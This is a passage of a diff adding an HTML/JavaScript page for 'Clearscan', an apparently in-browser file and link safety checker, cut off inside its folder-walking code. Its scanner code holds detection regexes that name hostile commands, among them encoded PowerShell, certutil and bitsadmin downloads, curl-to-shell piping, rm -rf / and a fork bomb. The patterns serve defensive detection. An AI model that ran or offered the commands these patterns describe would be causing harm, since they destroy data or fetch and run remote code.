@@ -1,0 +1,596 @@
+<!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<title>Clearscan</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap">
+<style>
+/* Layout: sticky frosted nav with two tabs; inset-grouped lists on a quiet gray ground, one blue accent, semantic green/orange/red for status. */
+:root{
+  --bg:#f5f5f7; --surface:#ffffff; --surface-2:#f2f2f5; --fg:#1d1d1f; --fg-2:#6e6e73; --line:rgba(0,0,0,.09);
+  --blue:#0071e3; --blue-bg:rgba(0,113,227,.10);
+  --green:#1f8a3b; --green-bg:rgba(52,199,89,.16);
+  --orange:#b85c00; --orange-bg:rgba(255,159,10,.18);
+  --red:#d1202f; --red-bg:rgba(255,59,48,.13);
+  --mute:#6e6e73; --mute-bg:rgba(120,120,128,.14);
+  --nav:rgba(245,245,247,.78); --shadow:0 1px 2px rgba(0,0,0,.06);
+  --font:-apple-system,BlinkMacSystemFont,"SF Pro Text","Inter","Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,monospace;
+}
+@media (prefers-color-scheme: dark){:root:not([data-theme="light"]){
+  --bg:#000000; --surface:#1c1c1e; --surface-2:#2c2c2e; --fg:#f5f5f7; --fg-2:#98989f; --line:rgba(255,255,255,.12);
+  --blue:#2997ff; --blue-bg:rgba(41,151,255,.16);
+  --green:#32d74b; --green-bg:rgba(48,209,88,.18);
+  --orange:#ff9f0a; --orange-bg:rgba(255,159,10,.18);
+  --red:#ff6961; --red-bg:rgba(255,69,58,.18);
+  --mute:#98989f; --mute-bg:rgba(152,152,159,.18);
+  --nav:rgba(0,0,0,.72); --shadow:none; color-scheme:dark}}
+:root[data-theme="dark"]{
+  --bg:#000000; --surface:#1c1c1e; --surface-2:#2c2c2e; --fg:#f5f5f7; --fg-2:#98989f; --line:rgba(255,255,255,.12);
+  --blue:#2997ff; --blue-bg:rgba(41,151,255,.16);
+  --green:#32d74b; --green-bg:rgba(48,209,88,.18);
+  --orange:#ff9f0a; --orange-bg:rgba(255,159,10,.18);
+  --red:#ff6961; --red-bg:rgba(255,69,58,.18);
+  --mute:#98989f; --mute-bg:rgba(152,152,159,.18);
+  --nav:rgba(0,0,0,.72); --shadow:none; color-scheme:dark}
+
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font:15px/1.47 var(--font);-webkit-font-smoothing:antialiased;padding-bottom:56px}
+body::before{content:"";position:fixed;inset:0 0 auto;height:env(safe-area-inset-top,0px);z-index:30;background:var(--nav);-webkit-backdrop-filter:saturate(180%) blur(20px);backdrop-filter:saturate(180%) blur(20px)}
+.wrap{width:100%;max-width:912px;margin:0 auto;padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px))}
+button,input{font:inherit;color:inherit}
+button{cursor:pointer}
+:focus-visible{outline:2px solid var(--blue);outline-offset:2px}
+.ic{width:20px;height:20px;flex:none}
+
+/* nav */
+.nav{position:sticky;top:env(safe-area-inset-top,0px);z-index:31;background:var(--nav);-webkit-backdrop-filter:saturate(180%) blur(20px);backdrop-filter:saturate(180%) blur(20px);border-bottom:1px solid var(--line)}
+.nav .wrap{display:flex;align-items:center;justify-content:space-between;gap:12px;height:56px}
+.brand{display:flex;align-items:center;gap:8px;font-weight:600;font-size:17px;letter-spacing:-.01em}
+.brand .ic{color:var(--blue);width:24px;height:24px}
+.seg{display:flex;background:var(--mute-bg);border-radius:10px;padding:2px;gap:2px}
+.seg button{border:0;background:none;padding:6px 18px;border-radius:8px;font-weight:500;font-size:14px;min-height:32px;color:var(--fg)}
+.seg button[aria-selected="true"]{background:var(--surface);box-shadow:0 1px 3px rgba(0,0,0,.14)}
+@media (max-width:420px){.brand span{display:none}.seg{flex:1}.seg button{flex:1}}
+
+main{display:grid;gap:28px;padding-top:24px}
+.view{display:grid;gap:24px}
+.view[hidden]{display:none}
+
+/* hero */
+.hero{background:var(--surface);border-radius:24px;padding:28px;display:grid;grid-template-columns:auto 1fr;gap:24px;align-items:center;box-shadow:var(--shadow);outline:2px dashed transparent;outline-offset:-8px;transition:outline-color .15s}
+.hero.drag{outline-color:var(--blue)}
+@media (max-width:560px){.hero{grid-template-columns:1fr;justify-items:start;padding:22px}}
+.ring{--st:var(--blue);position:relative;width:104px;height:104px;color:var(--st)}
+.ring[data-s="ok"]{--st:var(--green)} .ring[data-s="warn"]{--st:var(--orange)} .ring[data-s="bad"]{--st:var(--red)}
+.ring svg.r{width:100%;height:100%}
+.ring circle{fill:none;stroke-width:6}
+.ring .trk{stroke:var(--mute-bg)}
+.ring .prg{stroke:var(--st);stroke-linecap:round;transition:stroke-dashoffset .25s ease}
+.ringic{position:absolute;inset:0;display:grid;place-items:center}
+.ringic .ic{width:44px;height:44px;stroke-width:1.6}
+.hero h1{margin:0;font-size:28px;line-height:1.15;letter-spacing:-.02em;font-weight:700;text-wrap:balance}
+.hero p{margin:6px 0 0;color:var(--fg-2);max-width:52ch;overflow-wrap:anywhere}
+.stats{display:flex;flex-wrap:wrap;gap:8px;margin-top:14px}
+.chip{font-size:13px;font-weight:600;padding:4px 12px;border-radius:99px;background:var(--mute-bg);color:var(--fg-2);font-variant-numeric:tabular-nums}
+.chip.bad{background:var(--red-bg);color:var(--red)} .chip.warn{background:var(--orange-bg);color:var(--orange)} .chip.ok{background:var(--green-bg);color:var(--green)}
+.actions{display:flex;flex-wrap:wrap;gap:10px;margin-top:18px;align-items:center}
+.btn{border:0;border-radius:99px;padding:10px 20px;min-height:44px;font-weight:600;font-size:15px;background:var(--blue);color:#fff;transition:filter .15s}
+.btn:hover{filter:brightness(1.08)} .btn:disabled{opacity:.45;cursor:default;filter:none}
+.btn.sec{background:var(--blue-bg);color:var(--blue)}
+.btn.txt{background:none;color:var(--blue);padding-left:8px;padding-right:8px}
+.btn.sm{min-height:36px;padding:6px 14px;font-size:14px}
+.btn.danger{background:var(--red-bg);color:var(--red)}
+
+/* lists */
+.sec-h{display:flex;align-items:baseline;justify-content:space-between;gap:12px;margin:0 4px 8px}
+.sec-h h2{margin:0;font-size:20px;letter-spacing:-.015em;font-weight:700}
+.sec-h .btn{min-height:32px}
+.group{list-style:none;margin:0;padding:0;background:var(--surface);border-radius:18px;overflow:hidden;box-shadow:var(--shadow)}
+.group>li+li{border-top:1px solid var(--line)}
+summary{list-style:none;display:flex;align-items:center;gap:12px;padding:12px 16px;cursor:pointer;min-height:60px}
+summary::-webkit-details-marker{display:none}
+details[open]>summary .chev{transform:rotate(90deg)}
+.chev{color:var(--fg-2);transition:transform .15s;width:16px;height:16px}
+.nm{flex:1;min-width:0;display:flex;flex-direction:column}
+.nm b{font-weight:600;overflow-wrap:anywhere;line-height:1.3}
+.nm small{color:var(--fg-2);overflow-wrap:anywhere;font-size:13px}
+.nm small em{font-style:normal;color:var(--blue);font-weight:600}
+.lv-ok{--c:var(--green);--c-bg:var(--green-bg)} .lv-warn{--c:var(--orange);--c-bg:var(--orange-bg)} .lv-bad{--c:var(--red);--c-bg:var(--red-bg)} .lv-mute{--c:var(--mute);--c-bg:var(--mute-bg)}
+.ico{width:38px;height:38px;border-radius:11px;display:grid;place-items:center;flex:none;color:var(--c);background:var(--c-bg)}
+.pill{flex:none;font-size:12px;font-weight:600;padding:3px 10px;border-radius:99px;color:var(--c);background:var(--c-bg);white-space:nowrap}
+.body{padding:0 16px 16px 66px;display:grid;gap:12px}
+@media (max-width:560px){.body{padding-left:16px}}
+.finds{list-style:none;margin:0;padding:0;display:grid;gap:10px}
+.finds li{display:grid;grid-template-columns:10px 1fr;gap:10px;align-items:start}
+.finds i{width:8px;height:8px;border-radius:50%;margin-top:7px;background:var(--mute)}
+.finds .high i{background:var(--red)} .finds .med i{background:var(--orange)} .finds .low i{background:#e0b000} .finds .info i{background:var(--blue)}
+.finds b{font-weight:600} .finds span{display:block;color:var(--fg-2);font-size:14px}
+.hash{font:12px/1.4 var(--mono);color:var(--fg-2);overflow-wrap:anywhere;background:var(--surface-2);padding:8px 10px;border-radius:10px}
+.row-actions{display:flex;flex-wrap:wrap;gap:8px}
+.row-actions a.btn{display:inline-flex;align-items:center;text-decoration:none}
+.tag{font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.04em;color:var(--blue)}
+
+/* info card */
+.note{background:var(--surface);border-radius:18px;padding:18px 20px;box-shadow:var(--shadow)}
+.note h3{margin:0 0 8px;font-size:16px;font-weight:600}
+.note ul,.note ol{margin:0;padding-left:20px;display:grid;gap:6px;color:var(--fg-2);font-size:14px}
+.note details summary{min-height:0;padding:0;font-weight:600;color:var(--blue)}
+.note details>*:not(summary){margin-top:10px}
+
+/* links */
+.addrow{display:flex;gap:8px;align-items:center;background:var(--surface);border-radius:16px;padding:6px 6px 6px 16px;box-shadow:var(--shadow)}
+.addrow input{flex:1;min-width:0;border:0;background:none;font-size:16px;padding:8px 0;outline:none}
+.addrow input::placeholder{color:var(--fg-2)}
+.lead{margin:0 4px;color:var(--fg-2);max-width:62ch}
+.view h1.t{margin:0 4px;font-size:32px;line-height:1.1;letter-spacing:-.025em;font-weight:700}
+.empty{padding:28px 20px;text-align:left;color:var(--fg-2)}
+
+.toast{position:fixed;left:50%;bottom:calc(20px + env(safe-area-inset-bottom,0px));transform:translate(-50%,20px);background:var(--fg);color:var(--bg);padding:10px 18px;border-radius:99px;font-size:14px;font-weight:500;opacity:0;pointer-events:none;transition:opacity .2s,transform .2s;z-index:40;max-width:calc(100vw - 32px);text-align:center}
+.toast.on{opacity:1;transform:translate(-50%,0)}
+@media (prefers-reduced-motion:reduce){*{transition:none!important;animation:none!important}}
+</style>
+
+<header class="nav">
+  <div class="wrap">
+    <div class="brand" id="brand"></div>
+    <div class="seg" role="tablist" aria-label="Sections">
+      <button role="tab" data-tab="scan" aria-selected="true">Files</button>
+      <button role="tab" data-tab="links" aria-selected="false">Links</button>
+    </div>
+  </div>
+</header>
+
+<main class="wrap">
+  <!-- FILES -->
+  <section class="view" id="view-scan">
+    <div class="hero" id="hero">
+      <div class="ring" id="ring" data-s="idle">
+        <svg class="r" viewBox="0 0 100 100" aria-hidden="true"><circle class="trk" cx="50" cy="50" r="44"/><circle class="prg" id="prg" cx="50" cy="50" r="44" pathLength="100" stroke-dasharray="100" stroke-dashoffset="0" transform="rotate(-90 50 50)"/></svg>
+        <span class="ringic" id="ringic"></span>
+      </div>
+      <div>
+        <h1 id="hTitle">Check your files</h1>
+        <p id="hSub">Pick files or a folder, or drop them here. Every file is analyzed on this device and nothing is uploaded.</p>
+        <div class="stats" id="hStats" hidden></div>
+        <div class="actions">
+          <button class="btn" id="bFiles">Choose files</button>
+          <button class="btn sec" id="bFolder">Choose folder</button>
+          <button class="btn txt" id="bDemo">Try a demo</button>
+        </div>
+      </div>
+    </div>
+    <input type="file" id="fi" multiple hidden>
+    <input type="file" id="fd" webkitdirectory multiple hidden>
+
+    <div id="resWrap" hidden>
+      <div class="sec-h"><h2>Results</h2><button class="btn sec sm" id="bClear">Clear results</button></div>
+      <ul class="group" id="resList"></ul>
+    </div>
+
+    <div class="note" id="howTo" hidden>
+      <details>
+        <summary>How to remove a flagged file</summary>
+        <ol>
+          <li><b>Windows:</b> select the file, press Delete, then empty the Recycle Bin. Open Windows Security, then Virus &amp; threat protection, and run a Quick scan.</li>
+          <li><b>Mac:</b> drag the file to the Bin and choose Empty Bin. Remove unknown apps from Applications.</li>
+          <li><b>Android:</b> open Files, long-press the file and tap Delete. In Play Store, open Play Protect and tap Scan.</li>
+          <li><b>iPhone and iPad:</b> delete the file in Files. Under Settings, General, VPN &amp; Device Management, remove any profile you don't recognize.</li>
+        </ol>
+      </details>
+    </div>
+
+    <div class="note">
+      <h3>What Clearscan can and can't do</h3>
+      <ul>
+        <li>It checks the files you choose: known test signatures, SHA-256 hashes, disguised file types, risky names, macros, PDF scripts and suspicious script commands.</li>
+        <li>A web page can't read your whole device, running programs or memory, and it can't delete files. You remove flagged files yourself.</li>
+        <li>These are heuristics, not a full signature database. "No issues" is not a guarantee. Keep Windows Security, Play Protect or XProtect on.</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- LINKS -->
+  <section class="view" id="view-links" hidden>
+    <h1 class="t">Is this link safe?</h1>
+    <p class="lead">Paste one or more links. Each one is checked on this device for look-alike domains, hidden destinations, risky downloads and phishing patterns.</p>
+    <form class="addrow" id="addForm" autocomplete="off">
+      <input id="lkIn" type="text" inputmode="url" autocapitalize="off" spellcheck="false" placeholder="Paste a link, for example https://example.com" aria-label="Link to check">
+      <button class="btn" type="submit">Check</button>
+    </form>
+    <div id="lkWrap">
+      <div class="sec-h"><h2>Your links</h2><span id="lkSum" class="chip"></span></div>
+      <ul class="group" id="lkList"></ul>
+      <div class="actions" style="margin:12px 4px 0">
+        <button class="btn sec sm" id="bExamples" hidden>Remove examples</button>
+        <button class="btn danger sm" id="bClearLinks" hidden>Clear my links</button>
+      </div>
+    </div>
+    <div class="note">
+      <h3>About these results</h3>
+      <ul>
+        <li>The check reads the address itself. It does not open the page, so a new scam on a clean-looking address can still pass.</li>
+        <li>For a second opinion, use the VirusTotal and Google Safe Browsing buttons on each link. They open in a new tab.</li>
+        <li>Even a trusted site can host a bad page. Never enter passwords or OTPs from a link you didn't expect.</li>
+      </ul>
+    </div>
+  </section>
+</main>
+<div class="toast" id="toast" role="status" aria-live="polite"></div>
+
+<script>
+(function(){
+'use strict';
+var $=function(s){return document.querySelector(s)};
+var esc=function(s){return String(s).replace(/[&<>"']/g,function(c){return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]})};
+var IC={
+  shield:'<path d="M12 3l7.5 3v5.2c0 4.6-3.1 8.3-7.5 9.8-4.4-1.5-7.5-5.2-7.5-9.8V6L12 3z"/>',
+  check:'<path d="M12 3l7.5 3v5.2c0 4.6-3.1 8.3-7.5 9.8-4.4-1.5-7.5-5.2-7.5-9.8V6L12 3z"/><path d="M8.6 12.2l2.4 2.4 4.5-4.9"/>',
+  alert:'<path d="M12 3l7.5 3v5.2c0 4.6-3.1 8.3-7.5 9.8-4.4-1.5-7.5-5.2-7.5-9.8V6L12 3z"/><path d="M12 8.4v4.2M12 15.7v.1"/>',
+  file:'<path d="M7 3h7l4 4v13a1 1 0 0 1-1 1H7a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1z"/><path d="M14 3v4h4"/>',
+  link:'<path d="M10 14a4 4 0 0 0 5.7 0l3-3a4 4 0 0 0-5.7-5.7l-1 1"/><path d="M14 10a4 4 0 0 0-5.7 0l-3 3A4 4 0 0 0 11 18.7l1-1"/>',
+  chev:'<path d="M9 6l6 6-6 6"/>'
+};
+function svg(p,c){return '<svg class="ic '+(c||'')+'" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">'+p+'</svg>'}
+$('#brand').innerHTML=svg(IC.check)+'<span>Clearscan</span>';
+
+var tt;
+function toast(m){var t=$('#toast');t.textContent=m;t.classList.add('on');clearTimeout(tt);tt=setTimeout(function(){t.classList.remove('on')},2400)}
+function fmtSize(n){if(n<1024)return n+' B';if(n<1048576)return (n/1024).toFixed(1)+' KB';if(n<1073741824)return (n/1048576).toFixed(1)+' MB';return (n/1073741824).toFixed(2)+' GB'}
+function copy(text){
+  try{return navigator.clipboard.writeText(text).then(function(){toast('Copied')},function(){toast('Copy is not available here')})}
+  catch(e){toast('Copy is not available here')}
+}
+var openSet=new Set();
+document.addEventListener('toggle',function(e){var d=e.target;if(d&&d.dataset&&d.dataset.k){if(d.open)openSet.add(d.dataset.k);else openSet.delete(d.dataset.k)}},true);
+
+/* tabs */
+function show(tab){
+  document.querySelectorAll('.view').forEach(function(v){v.hidden=v.id!=='view-'+tab});
+  document.querySelectorAll('.seg button').forEach(function(b){b.setAttribute('aria-selected',String(b.dataset.tab===tab))});
+}
+document.querySelectorAll('.seg button').forEach(function(b){b.addEventListener('click',function(){location.hash=b.dataset.tab;window.scrollTo(0,0)})});
+window.addEventListener('hashchange',function(){show(location.hash==='#links'?'links':'scan')});
+show(location.hash==='#links'?'links':'scan');
+
+/* ============ FILE SCANNER ============ */
+var PROGRAM=new Set(['exe','scr','com','pif','msi','dll','sys','cpl','jar','apk','dmg','pkg','app']);
+var SCRIPT=new Set(['bat','cmd','vbs','vbe','js','jse','wsf','wsh','ps1','psm1','hta','lnk','reg','sh']);
+var BENIGN=new Set(['jpg','jpeg','png','gif','webp','bmp','heic','pdf','doc','docx','xls','xlsx','ppt','pptx','txt','rtf','csv','mp3','mp4','mov','wav','avi','mkv','m4a','odt','ods']);
+var MACRO_EXT=new Set(['docm','xlsm','pptm','xlam','dotm','xltm','ppam']);
+var DOUBLE=/\.(pdf|docx?|xlsx?|pptx?|jpe?g|png|gif|txt|mp3|mp4|zip|rtf|csv)\s*\.(exe|scr|bat|cmd|com|pif|vbs|vbe|js|jse|wsf|ps1|msi|jar|apk|lnk|hta|cpl|reg)$/i;
+var KNOWN={'275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f':'EICAR antivirus test file'};
+var PAT=[
+  [/powershell[^\r\n]{0,60}\s-(?:e|ec|enc|encodedcommand)\s/i,'high','Encoded PowerShell command','Hides what the script does. Malware uses this to avoid detection.'],
+  [/certutil[^\r\n]{0,40}-urlcache|bitsadmin[^\r\n]{0,40}\/transfer|mshta[^\r\n]{0,20}(?:https?:|vbscript:|javascript:)|regsvr32[^\r\n]{0,60}(?:\/i:https?|scrobj)/i,'high','Windows tool used to fetch or run remote code','Legitimate tools abused to download and start malware.'],
+  [/eval\s*\(\s*(?:atob|unescape|String\.fromCharCode)/i,'high','Obfuscated JavaScript','Code is decoded and run at the last moment to hide its purpose.'],
+  [/rm\s+-rf\s+(?:\/|~)(?:\s|$|\*)/,'high','Command that wipes files','Deletes everything under a top-level folder.'],
+  [/:\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:/,'high','Fork bomb','Freezes a computer by starting processes endlessly.'],
+  [/invoke-expression|\biex\s*[\s(]/i,'med','Runs text as code','Invoke-Expression executes whatever string it is given.'],
+  [/downloadstring|downloadfile|net\.webclient|invoke-webrequest|start-bitstransfer/i,'med','Downloads content from the internet','Scripts that fetch more code are a common first stage of malware.'],
+  [/wscript\.shell|shell\.application/i,'med','Runs system commands through Windows Script Host','Lets a script start programs and change the system.'],
+  [/document\.write\s*\(\s*unescape/i,'med','Obfuscated page injection','Builds page content from encoded text.'],
+  [/(?:curl|wget)[^\r\n|]{0,120}\|\s*(?:sudo\s+)?(?:ba|z)?sh\b/i,'med','Downloads and runs a script in one step','Nothing is reviewed between download and execution.'],
+  [/currentversion\\run/i,'med','Adds itself to startup','Programs that start with the computer can persist after a restart.'],
+  [/cmd(?:\.exe)?\s+\/c\s/i,'low','Runs command prompt commands','Common in installers, also common in malware.']
+];
+
+function sniff(b){
+  if(b.length<2)return '';
+  if(b[0]===0x4d&&b[1]===0x5a)return 'pe';
+  if(b.length<4)return '';
+  if(b[0]===0x7f&&b[1]===0x45&&b[2]===0x4c&&b[3]===0x46)return 'elf';
+  var m=((b[0]<<24)|(b[1]<<16)|(b[2]<<8)|b[3])>>>0;
+  if(m===0xfeedface||m===0xfeedfacf||m===0xcefaedfe||m===0xcffaedfe)return 'macho';
+  if(b[0]===0x25&&b[1]===0x50&&b[2]===0x44&&b[3]===0x46)return 'pdf';
+  if(b[0]===0x50&&b[1]===0x4b&&(b[2]===3||b[2]===5))return 'zip';
+  if(m===0xd0cf11e0)return 'ole';
+  if(b[0]===0x23&&b[1]===0x21)return 'shebang';
+  return '';
+}
+function entropy(b){
+  var n=Math.min(b.length,1048576);if(n<65536)return 0;
+  var c=new Uint32Array(256),i,e=0,p;
+  for(i=0;i<n;i++)c[b[i]]++;
+  for(i=0;i<256;i++){if(c[i]){p=c[i]/n;e-=p*Math.log2(p)}}
+  return e;
+}
+var uid=0;
+async function analyze(file){
+  var path=file.webkitRelativePath||file._path||file.name;
+  var name=file.name;
+  var r={id:++uid,name:name,dir:path.indexOf('/')>-1?path.slice(0,path.lastIndexOf('/')+1):'',size:file.size,findings:[],level:'clean',hash:'',demo:!!file._demo,partial:false};
+  var F=function(lv,t,d){r.findings.push({lv:lv,t:t,d:d})};
+  try{
+    var ext=name.indexOf('.')>-1?name.split('.').pop().toLowerCase():'';
+    var headLen=Math.min(file.size,4*1024*1024);
+    var head=new Uint8Array(await file.slice(0,headLen).arrayBuffer());
+    var tail=null;
+    if(file.size>headLen){tail=new Uint8Array(await file.slice(Math.max(headLen,file.size-1048576),file.size).arrayBuffer());r.partial=true}
+    var dec=new TextDecoder('windows-1252');
+    var text=dec.decode(head)+(tail?'\n'+dec.decode(tail):'');
+    var kind=sniff(head);
+    var isExecKind=(kind==='pe'||kind==='elf'||kind==='macho');
+    var isText=true,i,lim=Math.min(head.length,4096);
+    for(i=0;i<lim;i++){if(head[i]===0){isText=false;break}}
+
+    /* hash + known signatures */
+    try{
+      if(file.size<=64*1024*1024){
+        var buf=file.size<=headLen?head:new Uint8Array(await file.arrayBuffer());
+        var dg=new Uint8Array(await crypto.subtle.digest('SHA-256',buf));
+        r.hash=Array.prototype.map.call(dg,function(x){return ('0'+x.toString(16)).slice(-2)}).join('');
+      }
+    }catch(e){}
+    var eicar=text.indexOf('EICAR-STANDARD-ANTIVIRUS-TEST-FILE')>-1;
+    if(eicar)F('high','EICAR antivirus test file','This is the industry-standard harmless file used to prove a scanner works. Real malware is not present.');
+    else if(r.hash&&KNOWN[r.hash])F('high','Matches a known threat: '+KNOWN[r.hash],'The SHA-256 hash is on the built-in list.');
+
+    /* name tricks */
+    if(/[‮‭⁦-⁩]/.test(name))F('high','Hidden text direction characters in the name','The name is written so the real extension looks different from what it is.');
+    if(DOUBLE.test(name))F('high','Double file extension','The file looks like a document or picture but ends in a program or script extension.');
+
+    /* real type vs extension */
+    if(isExecKind&&BENIGN.has(ext))F('high','Program disguised as a '+ext.toUpperCase()+' file','The contents are an executable program, not a '+ext+' file.');
+    else if(isExecKind&&!PROGRAM.has(ext)&&!SCRIPT.has(ext))F('med','Executable content with an unusual name','The file header says it is a program, but the name does not say so.');
+    else if(PROGRAM.has(ext)||SCRIPT.has(ext)){
+      if(ext==='lnk'||ext==='hta'||ext==='scr'||ext==='pif')F('med','High-risk file type (.'+ext+')','This type is often used to deliver malware by email.');
+      else F('low','Runnable file type (.'+ext+')','Only open programs and scripts from sources you trust.');
+    }
+
+    /* documents */
+    if(MACRO_EXT.has(ext))F('low','Macro-enabled Office format','Macros can run code when the document is opened.');
+    if(kind==='zip'&&text.indexOf('vbaProject.bin')>-1)F('med','Contains VBA macros','Office macros are a frequent malware delivery method.');
+    if(kind==='ole'&&text.indexOf('V\u0000B\u0000A\u0000')>-1)F('med','Contains VBA macros','Office macros are a frequent malware delivery method.');
+    if(kind==='pdf'){
+      if(/\/Launch\b/.test(text))F('med','PDF can launch programs','The PDF contains a Launch action.');
+      if(/\/JavaScript\b|\/JS\b/.test(text))F('med','PDF contains JavaScript','Scripts inside PDFs are rarely needed and are used in exploits.');
+      if(/\/OpenAction\b|\/AA\b/.test(text))F('low','PDF runs an action on open','The PDF starts something automatically.');
+    }
+
+    /* scripts and text */
+    if(isText&&file.size>0){
+      var meds=0;
+      PAT.forEach(function(p){if(p[0].test(text)){F(p[1],p[2],p[3]);if(p[1]==='med')meds++}});
+      if(meds>=2&&!r.findings.some(function(x){return x.lv==='high'}))F('high','Several malicious-script indicators together','Each sign alone can be legitimate. Together they match how malware loaders behave.');
+    }
+
+    /* packed executables */
+    if(isExecKind){var en=entropy(head);if(en>7.4)F('low','Packed or encrypted contents','Very high randomness. Malware often hides this way, though some installers do too.')}
+
+    if(r.partial)F('info','Large file','Scanned the first 4 MB and the last 1 MB. The hash is skipped above 64 MB.');
+  }catch(e){
+    r.level='skip';F('info','Could not read this file','The browser was not allowed to read it. Try choosing it again.');return r;
+  }
+  var hi=r.findings.some(function(x){return x.lv==='high'});
+  var me=r.findings.some(function(x){return x.lv==='med'});
+  var lo=r.findings.filter(function(x){return x.lv==='low'}).length;
+  r.level=hi?'bad':(me||lo>=2)?'warn':'clean';
+  return r;
+}
+
+var S={results:[],scanning:false,i:0,n:0,cur:''};
+function counts(){var b=0,w=0,o=0;S.results.forEach(function(r){if(r.level==='bad')b++;else if(r.level==='warn')w++;else o++});return {bad:b,warn:w,ok:o,total:S.results.length}}
+function updateHero(){
+  var c=counts(),st='idle',icon=IC.shield,title,sub,pct=100;
+  if(S.scanning){st='idle';pct=S.n?Math.round(S.i/S.n*100):0;title='Scanning…';sub=S.i+' of '+S.n+' · '+S.cur}
+  else if(!c.total){title='Check your files';sub='Pick files or a folder, or drop them here. Every file is analyzed on this device and nothing is uploaded.'}
+  else if(c.bad){st='bad';icon=IC.alert;title=c.bad===1?'1 threat found':c.bad+' threats found';sub='Delete flagged files yourself. A web page can’t remove files from your device. Steps are below.'}
+  else if(c.warn){st='warn';icon=IC.alert;title=c.warn===1?'1 item needs a look':c.warn+' items need a look';sub='These files have traits worth checking before you open them.'}
+  else{st='ok';icon=IC.check;title='No issues found';sub=c.total+(c.total===1?' file':' files')+' checked on this device. No known signatures or suspicious traits.'}
+  $('#ring').dataset.s=st;
+  $('#prg').setAttribute('stroke-dashoffset',String(100-pct));
+  $('#ringic').innerHTML=svg(icon);
+  $('#hTitle').textContent=title;$('#hSub').textContent=sub;
+  var hs=$('#hStats');
+  if(c.total&&!S.scanning){
+    hs.hidden=false;
+    hs.innerHTML='<span class="chip">'+c.total+' scanned</span>'+(c.bad?'<span class="chip bad">'+c.bad+' threat'+(c.bad>1?'s':'')+'</span>':'')+(c.warn?'<span class="chip warn">'+c.warn+' suspicious</span>':'')+(c.ok?'<span class="chip ok">'+c.ok+' no issues</span>':'');
+  }else hs.hidden=true;
+  ['#bFiles','#bFolder','#bDemo'].forEach(function(s){$(s).disabled=S.scanning});
+  $('#howTo').hidden=!(c.bad||c.warn);
+  $('#resWrap').hidden=!c.total;
+}
+var PILL={bad:['Threat','lv-bad'],warn:['Suspicious','lv-warn'],clean:['No issues','lv-ok'],skip:['Not scanned','lv-mute']};
+function report(r){
+  return r.name+'\nVerdict: '+PILL[r.level][0]+'\nSize: '+fmtSize(r.size)+(r.hash?'\nSHA-256: '+r.hash:'')+'\n'+r.findings.map(function(f){return '- '+f.t+': '+f.d}).join('\n');
+}
+function rowHTML(r){
+  var p=PILL[r.level],k='f'+r.id;
+  var finds=r.findings.length?'<ul class="finds">'+r.findings.map(function(f){return '<li class="'+f.lv+'"><i></i><div><b>'+esc(f.t)+'</b><span>'+esc(f.d)+'</span></div></li>'}).join('')+'</ul>':'<p style="margin:0;color:var(--fg-2)">No known signatures, disguised file types or suspicious script patterns were found.</p>';
+  return '<li><details data-k="'+k+'"'+(openSet.has(k)?' open':'')+'><summary><span class="ico '+p[1]+'">'+svg(IC.file)+'</span><span class="nm"><b>'+esc(r.name)+'</b><small>'+(r.demo?'<em>Demo</em> · ':'')+esc(r.dir)+fmtSize(r.size)+'</small></span><span class="pill '+p[1]+'">'+p[0]+'</span>'+svg(IC.chev,'chev')+'</summary><div class="body">'+finds+(r.hash?'<div class="hash">SHA-256 '+r.hash+'</div>':'')+'<div class="row-actions"><button class="btn sec sm" data-act="cp" data-id="'+r.id+'">Copy details</button><button class="btn sec sm" data-act="rm" data-id="'+r.id+'">Remove from list</button></div></div></details></li>';
+}
+function renderResults(){
+  var order={bad:0,warn:1,clean:2,skip:3};
+  var list=S.results.slice().sort(function(a,b){return order[a.level]-order[b.level]||a.id-b.id});
+  $('#resList').innerHTML=list.map(rowHTML).join('');
+  updateHero();
+}
+$('#resList').addEventListener('click',function(e){
+  var b=e.target.closest('[data-act]');if(!b)return;
+  var id=+b.dataset.id,r=S.results.find(function(x){return x.id===id});if(!r)return;
+  if(b.dataset.act==='rm'){S.results=S.results.filter(function(x){return x.id!==id});renderResults();toast('Removed from the list. The file on your device is untouched.')}
+  else copy(report(r));
+});
+$('#bClear').addEventListener('click',function(){S.results=[];openSet.clear();renderResults()});
+function tick(){return new Promise(function(r){setTimeout(r,0)})}
+async function scanFiles(list){
+  list=Array.prototype.slice.call(list);
+  if(S.scanning||!list.length)return;
+  if(list.length>2000){list=list.slice(0,2000);toast('Scanning the first 2,000 files')}
+  S.scanning=true;S.i=0;S.n=list.length;S.cur='';updateHero();
+  for(var k=0;k<list.length;k++){
+    S.cur=list[k].name;S.i=k;updateHero();
+    S.results.push(await analyze(list[k]));
+    S.i=k+1;
+    if(k%4===3)await tick();
+  }
+  S.scanning=false;renderResults();
+}
+async function collectDrop(dt){
+  var out=[],items=Array.prototype.slice.call(dt.items||[]);
+  var entries=items.map(function(i){return i.webkitGetAsEntry&&i.webkitGetAsEntry()}).filter(Boolean);
+  if(!entries.length)return Array.prototype.slice.call(dt.files);
+  async function walk(en,path){
+    if(out.length>=2000)return;
+    if(en.isFile){
+      await new Promise(function(res){en.file(function(f){try{Object.defineProperty(f,'_path',{value:path+f.name})}catch(e){}out.push(f);res()},function(){res()})});
+    }else if(en.isDirectory){
